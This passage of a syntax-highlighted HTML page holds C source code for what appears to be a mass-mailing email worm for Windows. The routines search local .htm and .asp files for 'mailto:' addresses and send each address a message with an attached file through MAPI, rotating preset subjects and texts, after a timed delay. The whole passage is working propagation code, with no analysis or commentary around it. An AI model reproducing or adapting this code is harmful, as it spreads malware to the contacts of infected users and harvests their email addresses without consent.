            </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"\\%s"</span><span class="sc10">,</span><span class="sc11">fdata</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">findMail</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"*.ht*"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">findMail</span><span class="sc10">(</span><span class="sc11">buffer</span><span class="sc10">,</span><span class="sc6">"*.asp"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">fh</span><span class="sc10">,&amp;</span><span class="sc11">fdata</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc1">/* end the search */</span><span class="sc0">
            </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">fh</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">waitMin</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">min</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/* wait some time before work */</span><span class="sc0">
    </span><span class="sc11">mtime</span><span class="sc10">=(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc10">)</span><span class="sc11">GetTickCount</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">mtime</span><span class="sc10">+=(</span><span class="sc4">60000</span><span class="sc10">*</span><span class="sc11">min</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">mtime</span><span class="sc10">&gt;(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc10">)</span><span class="sc11">GetTickCount</span><span class="sc10">());</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">SendMail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">subject</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sfrom</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sto</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">smes</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

    </span><span class="sc11">memset</span><span class="sc10">(&amp;</span><span class="sc11">mes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiMessage</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">memset</span><span class="sc10">(&amp;</span><span class="sc11">from</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiRecipDesc</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc11">from</span><span class="sc10">.</span><span class="sc11">lpszName</span><span class="sc10">=</span><span class="sc11">sfrom</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// From
</span><span class="sc0">    </span><span class="sc11">from</span><span class="sc10">.</span><span class="sc11">ulRecipClass</span><span class="sc10">=</span><span class="sc11">MAPI_ORIG</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpszSubject</span><span class="sc10">=</span><span class="sc11">subject</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// Subject
</span><span class="sc0">    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">=(</span><span class="sc11">MapiRecipDesc</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiRecipDesc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiRecipDesc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc10">=</span><span class="sc11">sto</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// Send to
</span><span class="sc0">    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">ulRecipClass</span><span class="sc10">=</span><span class="sc11">MAPI_TO</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">nRecipCount</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">=(</span><span class="sc11">MapiFileDesc</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiFileDesc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiFileDesc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">lpszPathName</span><span class="sc10">=</span><span class="sc11">fileName</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">lpszFileName</span><span class="sc10">=</span><span class="sc11">fileNames</span><span class="sc10">[</span><span class="sc11">count</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">nFileCount</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpOriginator</span><span class="sc10">=&amp;</span><span class="sc11">from</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpszNoteText</span><span class="sc10">=</span><span class="sc11">smes</span><span class="sc10">;</span><span class="sc0">          </span><span class="sc2">// Message
</span><span class="sc0">    </span><span class="sc10">(</span><span class="sc11">MSendMail</span><span class="sc10">)(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">mes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">findMail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">wild</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">card</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">fh</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">fdata</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">mail</span><span class="sc10">[</span><span class="sc4">128</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc6">"%s\\%s"</span><span class="sc10">,</span><span class="sc11">wild</span><span class="sc10">,</span><span class="sc11">card</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fh</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,&amp;</span><span class="sc11">fdata</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">fh</span><span class="sc10">==</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc6">"%s\\%s"</span><span class="sc10">,</span><span class="sc11">wild</span><span class="sc10">,</span><span class="sc11">fdata</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">GetMail</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc11">mail</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">mail</span><span class="sc10">)&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">SendMail</span><span class="sc10">(</span><span class="sc11">subs</span><span class="sc10">[</span><span class="sc11">count</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mail</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">texts</span><span class="sc10">[</span><span class="sc11">count</span><span class="sc10">]);</span><span class="sc0">
            </span><span class="sc11">sent</span><span class="sc10">++;</span><span class="sc0">
            </span><span class="sc11">count</span><span class="sc10">++;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">count</span><span class="sc10">==</span><span class="sc11">NCUSTOM</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">count</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">fh</span><span class="sc10">,&amp;</span><span class="sc11">fdata</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">fh</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">GetMail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc19">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mail</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">fd2</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mapped</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc19">size</span><span class="sc10">,</span><span class="sc11">i</span><span class="sc10">,</span><span class="sc11">k</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">test</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc11">valid</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">mail</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">fd</span><span class="sc10">=</span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc19">name</span><span class="sc10">,</span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc11">FILE_ATTRIBUTE_ARCHIVE</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">==</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc19">size</span><span class="sc10">=</span><span class="sc11">GetFileSize</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc19">size</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc19">size</span><span class="sc10">&lt;</span><span class="sc4">256</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc19">size</span><span class="sc10">-=</span><span class="sc4">100</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">fd2</span><span class="sc10">=</span><span class="sc11">CreateFileMapping</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">PAGE_READONLY</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">fd2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">mapped</span><span class="sc10">=(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">MapViewOfFile</span><span class="sc10">(</span><span class="sc11">fd2</span><span class="sc10">,</span><span class="sc11">FILE_MAP_READ</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">mapped</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">fd2</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc19">size</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">test</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">strncmpi</span><span class="sc10">(</span><span class="sc6">"mailto:"</span><span class="sc10">,</span><span class="sc11">mapped</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc6">"mailto:"</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">test</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">i</span><span class="sc10">+=</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc6">"mailto:"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">mapped</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc4">34</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">mapped</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc4">39</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc19">size</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">&lt;</span><span class="sc4">127</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mapped</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc7">' '</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">mail</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]=</span><span class="sc11">mapped</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
                    </span><span class="sc11">k</span><span class="sc10">++;</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mapped</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]==</span><span class="sc7">'@'</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc11">valid</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">mail</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0">
            </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">valid</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">mail</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">UnmapViewOfFile</span><span class="sc10">(</span><span class="sc11">mapped</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">fd2</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span></div></body>
</html>
